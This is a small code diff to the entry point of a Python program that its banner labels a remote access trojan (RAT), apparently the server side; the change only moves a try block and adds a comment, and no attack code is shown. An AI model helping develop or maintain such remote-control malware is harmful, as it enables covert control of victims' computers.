@@ -44,9 +44,9 @@ class Main():
 		self._serv.levantar_servidor()
 
 
+# Ejecucion principal
 if __name__ == '__main__':
-	try:
-		banner = '''
+	banner = '''
 
 	████████╗ ██████╗ ██████╗  ██████╗        ██████╗ ██╗ ██████╗ ██╗ ██████╗ ██╗
 	╚══██╔══╝██╔═══██╗██╔══██╗██╔═══██╗      ██╔════╝ ██║██╔════╝ ██║██╔═══██╗██║
@@ -56,7 +56,9 @@ if __name__ == '__main__':
 	   ╚═╝    ╚═════╝ ╚═╝      ╚═════╝        ╚═════╝ ╚═╝ ╚═════╝ ╚═╝ ╚═════╝ ╚═╝
    
 			[!] RAT Python by bbkmg256 (v0.0.1) [!]
-	   '''
+	'''
+
+	try:
 		print(f"{banner}\n"); time.sleep(2)
 		
 		main = Main(sys.argv[1], sys.argv[2])
